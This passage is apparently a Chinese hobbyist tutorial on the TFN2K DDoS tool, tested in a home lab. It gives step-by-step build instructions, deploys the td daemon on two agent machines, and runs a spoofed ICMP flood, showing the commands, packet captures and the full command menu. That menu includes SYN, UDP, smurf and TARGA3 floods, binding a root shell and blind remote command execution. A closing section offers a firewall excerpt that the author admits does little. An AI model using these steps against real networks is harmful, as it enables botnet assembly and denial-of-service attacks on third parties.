二.tfn2k攻击原理

     1.tfn2k的攻击体系。

      tfn2k应该算是DDOS攻击中的代表作，其所能实现的功能让人瞠目结舌，叹为观止...(对它的敬畏有如滔滔江水，延续不绝...)来看看它

的架构。
     主控端---运行tfn客户端，来遥控并指定攻击目标，更改攻击方法.(罪大恶极)
     代理端---被植入并运行td进程的牺牲品，接受tfn的指挥，攻击的实施者.需要注意的是，一个攻击者，往往控制多台代理来完成攻击，而

且其系统多为unix,linux等.(可怜的牺牲品）
     目标主机---被攻击的主机或网络，曾经被DDOS的有Yahoo、Amazon、CNN、e-bay等.(最大的受害者，郁闷如我)
  
     2.tfn2k特性。  
       　◆ 主控端通过TCP、UDP、ICMP或随机性使用其中之一(默认.随机)的数据包向代理端主机发送命令,攻击方法包括TCP/SYN、UDP、

ICMP/PING、混合攻击、TARGA3等。
         ◆ 主控端与代理端的通讯采取单向，即主控端只向代理端发送命令，并且会采取随机的头信息，甚至虚拟的源地址信息,代理端不会

逆向向主控端发送任何信息.
         ◆ 所有命令经过CAST-256算法加命,其关键字即编译程序时的输入的口令.并且这个口令做为唯一认证凭证.
         ◆ 利用td进程，主控端可以远程执行shell命令.
         ◆ td进程的名称可以在编译时更改,更便于隐藏.
         ◆ tfn可以编译运行于win32及linux系统的.
          ...
         至于伪造源IP地址等功能，更是基本功能，并且其与老版本的tfn相比，它的发包效率更高，我自已的测试，在短短不到5分钟，两台

代理机，使我的redhat linux 9.0系统瘫痪.

三.tfn2k 实战测试
    1.测试环境:  
       软件：redhat linux 9.0
       硬件平台：  
          master:  
                IP: 192.168.0.6
               PIV2.4/256*2/rtl8139  
          Ag1 :  
                IP: 192.168.0.2
               PIV2.4/256*/rtl8139
          AG2 : IP: 192.168.0.3
               pIV2.6/512*2/3c905
          AIM: 192.168.0.5
               pIV2.66c/512*2/3c905
          switch: D_link des 1024R              

    1.下载tfn2k.tgz(因为此软件非比寻常，所以我并不提供下载地址，如果有兴趣，自已到网上找吧)
    2.解压： tar zxvf tfn2k.tgz  
    3.修改文件
       A. src/Makefile 如果你的系统是linux系统，不需要做任何修就可以，如果是win32系统，请将
            # Linux / *BSD* / Others
             CC = gcc
             CFLAGS = -Wall -O3
             CLIBS =
          这几行注释掉,并将
            # Win32 (cygwin)
            #CC = gcc
            #CFLAGS = -Wall -DWINDOZE -O2
            #CLIBS =
         这几行的注释去掉.因为我的测试系统为redhat linux 9.0所以并未做任何修改.

        B. src/config.h ，默认的就可以用，如果感兴趣，可以照其注释信息进行调整。
  
        C. src/ip.h   这里要做一些修改，否则编译会有错误，发生重复定义。
           /*struct in_addr
             {
              unsigned long int s_addr;
           };*/
           注意啊~~我可是将它放在"/*   */"之间，也就是注释掉了:)
        
         D.更改编译器：
           因为tfn2k支持的是egcs-1.1.2-30,而redhat linux 9.0所包含的是gcc-3.2.2-5,所以如果不替换掉gcc，tfn2k是编译不过去的.需

要注意的是，更改之后，有可能会造成基于gcc3.2.2的软件编译不去,请谨慎而行.
        方法很简单的，找到一张redhat linux 6.2安装盘,将egcs-1.1.2-30.rpm、cpp-1.1.2-30.rpm拷到~/
        cd /mnt/cdrom/Redhat/RPMS
        cp egcs-1.1.2-30* cpp-1.1.2-30* ~/
        安装cpp     rpm -Uvh --nodeps --oldpackage cpp-1.1.2-30.i386.rpm  
        安装egcs    rpm -Uvh egcs-1.1.2-30.i386.rpm (如果提示有误，用nodeps、oldpackages、ignoreos等参数忽略过去就是了）
  
     4.编译tfn2k
        cd tfn2k/src  
        make  
        首先会谈出一个声明，你必须接受，之后会提示输入8-32位密码,前边提到过，这是唯一的认证凭证，会被分发于td进程中，所以一定

要记牢噢~。
        编译通过后，会产生td及tfn，这就是大名鼎鼎的tfn2k啦~,td是守护进程，用来安装在代理中的，而tfn就是控制端.

      5.安装td.
        将td上传到我的两台代理,ag1(192.168.0.2)和ag2(192.168.0.3) ，因为我只不过测试，所以用的是合法的root来上传并执行td进程的

，如果真要找到并安装一个代理，你可能得费点儿神，因为没有一个管理员会说“come on baby ~~.我给你root,来安装td做代理吧”
      [root@test /] ftp 192.168.0.2
            Connected to 192.168.0.2.
            530 Please login with USER and PASS.
            530 Please login with USER and PASS.
            Name (192.168.0.2:root): wjpfjy
            331 Please specify the password.
            Password:
            230 Login successful. Have fun.
            Remote system type is UNIX.  
            Using binary mode to transfer files.
         ftp>; put td (上传td)
           local: td remote: td
           227 Entering Passive Mode (192,168,0,3,198,225)
           553 Could not create file.
         ftp>; by (退出ftp)    
          221 Goodbye.
      [root@test /]ssh 192.168.0.2 登陆到ag1 以执行td ,注意，我用的是root帐户，这样才有足够的权限来执行它.
              root@192.168.0.2's password:  
              Last login: Tue Feb 24 06:51:13 2004
      [root@ ag1 /]find / -name td -print 找到刚上传过来的文件td.
      [root@ ag1 wjpfjy/]chmod a+x td      使之具有执行权限.
      [root@ ag1 wjpfjy/]./td              运行td ，这样你就拥有一个代理了，它会对你唯命是从的:(。
　　　
　　用同样的方法在ag2 (192.168.0.3)上安装并运行TFN2k进程td.
     
     6.攻击开始(悲惨的回忆上演中...)
       回到master(192.168.0.6 )，准备演练...
　　　[root@master root]#touch host.txt     建立代理记录文件(因为如果你足够无聊的话，有可能会建立很多的肉鸡－代理，不记下会忘

记的噢.)  
       [root@master root]echo "192.168.0.2" >; host.txt 将执行过td的ag1加入host.txt。
　　　[root@master root]echo "192.168.0.3" >;>; host.txt 添加ag2到host.txt .
　　　先来测试一下链接。
　　　[root@master root]./tfn -f host.txt -c 10 -i "mkdir wjpfjy"   与host.txt中的代理通讯，让其执行命令mkdir wjpfjy即建立一个

目录
　      Protocol       : random
         Source IP      : random
         Client input   : list
         Command        : execute remote command

　　　Password verification:　　　　这里，会被提示输入密码，也就是编译时输入的密码,如果错了，将无法与td进程通讯

　　　Sending out packets: ..

    到ag1和ag2看看有没有建立目录名wjpfjy，一般情况下,会存在于td的同一目录,如果不确定，可以用find / -name wjpfjy -print来查找    
　　
　　　[root@master root]./tfn -f host.txt -c 6 -i 192.168.0.5　开始ICMP/PING 攻击aim...(可怜我的P4啊，不到5分钟,就跟386一样慢

)，不过它在game over前，还是很艰辛的记录下了攻击数据,也算是对得住的那NK大洋啦.这是tcpdump的抓包记录.
       [root@aim root]# tcpdump -r pack.atta -c 4 -xX
08:03:36.524907 23.43.171.0 >; 192.168.0.5 icmp: echo request [ttl 0]
0x0000    4500 005c 659d 0000 0001 d22e 172b ab00         E..\e........+..
0x0010    c0a8 0002 0800 f7ff 0000 0000 0000 0000         ................
0x0020    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0030    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0040    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0050    0000                                            ..
08:03:36.524933 192.168.0.5 >; 23.43.171.0: icmp: echo reply
0x0000    4500 005c a5d5 0000 4001 51f6 c0a8 0002         E..\....@.Q.....
0x0010    172b ab00 0000 ffff 0000 0000 0000 0000         .+..............
0x0020    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0030    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0040    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0050    0000                                            ..
08:03:36.524944 36.235.130.0 >; 192.168.0.5: icmp: echo request [ttl 0]
0x0000    4500 005c 659d 0000 0001 ed6e 24eb 8200         E..\e......n$...
0x0010    c0a8 0002 0800 f7ff 0000 0000 0000 0000         ................
0x0020    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0030    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0040    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0050    0000                                            ..
08:03:36.524984 192.168.0.5 >; 36.235.130.0: icmp: echo reply
0x0000    4500 005c 551c 0000 4001 bdef c0a8 0002         E..\U...@.......
0x0010    24eb 8200 0000 ffff 0000 0000 0000 0000         $...............
0x0020    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0030    0000 0000 0000 0000 0000 0000 0000 0000         ................
0x0040    0000 0000 0000 0000 0000 0000 0000 0000         ................
　    
　[root@master root]./tfn -f host.txt -c 0 停止攻击

         Protocol       : random
         Source IP      : random
         Client input   : list
         Command        : stop flooding

Password verification:

Sending out packets: ...

当然还有别的攻击方法，你只要用-c X就可以更改攻击方法.

    [root@master root]./tfn    
      usage: ./tfn <options>;
[-P protocol]    Protocol for server communication. Can be ICMP, UDP or TCP.
                 Uses a random protocol as default
[-D n]           Send out n bogus requests for each real one to decoy targets
[-S host/ip]     Specify your source IP. Randomly spoofed by default, you need
                 to use your real IP if you are behind spoof-filtering routers
[-f hostlist]    Filename containing a list of hosts with TFN servers to contact
[-h hostname]    To contact only a single host running a TFN server
[-i target string]       Contains options/targets separated by '@', see below
[-p port]                A TCP destination port can be specified for SYN floods
<-c command ID>; 0 - Halt all current floods on server(s) immediately
                 1 - Change IP antispoof-level (evade rfc2267 filtering)
                     usage: -i 0 (fully spoofed) to -i 3 (/24 host bytes spoofed)
                 2 - Change Packet size, usage: -i <packet size in bytes>;
                 3 - Bind root shell to a port, usage: -i <remote port>;
                 4 - UDP flood, usage: -i victim@victim2@victim3@...
                 5 - TCP/SYN flood, usage: -i victim@... [-p destination port]
                 6 - ICMP/PING flood, usage: -i victim@...
                 7 - ICMP/SMURF flood, usage: -i victim@broadcast@broadcast2@...
                 8 - MIX flood (UDP/TCP/ICMP interchanged), usage: -i victim@...
                 9 - TARGA3 flood (IP stack penetration), usage: -i victim@...
                 10 - Blindly execute remote shell command, usage -i command


四.防守办法
    就如同网上所有介绍DDOS的文章一样，DDOS防不胜防，我试着用防火墙过滤掉所有icmp包，来保护我的主机，但所实现的，只是我的主机晚

点儿崩溃而已.哎～，别指望我来防DDOS,要能防，我也不用不睡觉啊:(
　　还是那句老话，我们能做的，就是尽量让我们的主机不成为别人攻击的代理，并对intranet 内出行的包进行严格限制，尽量不去危害别人

，只要大家都这样做，我们的网络环境才可以安全一些，至少，我可以安心睡几天觉.
  
附上我防火墙的一部分.主要是针对ICMP/PING的，不过用处不太大:(



/sbin/iptables -P INPUT DROP
/sbin/iptables -A INPUT -i lo -p all -j ACCEPT
/sbin/iptables -A INPUT -i eth1 -p icmp -j ACCEPT
/sbin/iptables -A INPUT -p icmp --icmp-type 8 -j DROP
/sbin/iptables -A INPUT -s 127.0.0.2 -i lo -j ACCEPT
/sbin/iptables -A INPUT -s 127.0.0.2 -i eth0 -j DROP
/sbin/iptables -A INPUT -s $LAN_NET/24 -i eth0 -j DROP
/sbin/iptables -A INPUT -s 172.16.0.0/12 -i eth0 -j DROP
/sbin/iptables -A INPUT -s 10.0.0.0/8 -i eth0 -j DROP
/sbin/iptables -A INPUT -i eth0 -m limit --limit 1/sec --limit-burst 5 -j ACCEPT/sbin/iptables -A INPUT -i eth0 -p udp -m  

state --state NEW -j REJECT
/sbin/iptables -A INPUT -p tcp --dport 22 -j ACCEPT
/sbin/iptables -A INPUT -p tcp --dport 80 -j ACCEPT
/sbin/iptables -A INPUT -p tcp -i eth1 --dport 53 -j ACCEPT
/sbin/iptables -A INPUT -p udp -i eth1 --dport 53 -j ACCEPT
/sbin/iptables -A INPUT -p tcp -i eth0 -m state --state ESTABLISHED,RELATED -m tcp --dport 1024: -j ACCEPT
/sbin/iptables -A INPUT -p udp -i eth0 -m state --state ESTABLISHED,RELATED -m udp --dport 1024: -j ACCEPT
/sbin/iptables -A INPUT -p icmp --icmp-type echo-request -j LOG --log-level 2
/sbin/iptables -A INPUT -i eth0 -p icmp --icmp-type echo-request -j DROP
/sbin/iptables -A INPUT -p tcp -m multiport --destination-port 135,137,138,139 -j LOG
/sbin/iptables -A INPUT -p udp -m multiport --destination-port 135,137,138,139
-j LOG
/sbin/iptables -A INPUT -i eth0 -p tcp --dport 2000 -j ACCEPT
/sbin/iptables -A INPUT -i eth0 -p tcp --dport 2001 -j ACCEPT
/sbin/iptables -A INPUT -p tcp -i eth1 -m state --state ESTABLISHED,RELATED -m tcp --dport 1024: -j ACCEPT


　以上只是我个人的一些摸索经验，不足或错误之处，还望指证。如果您可以防止DDOS，也请告诉我:) 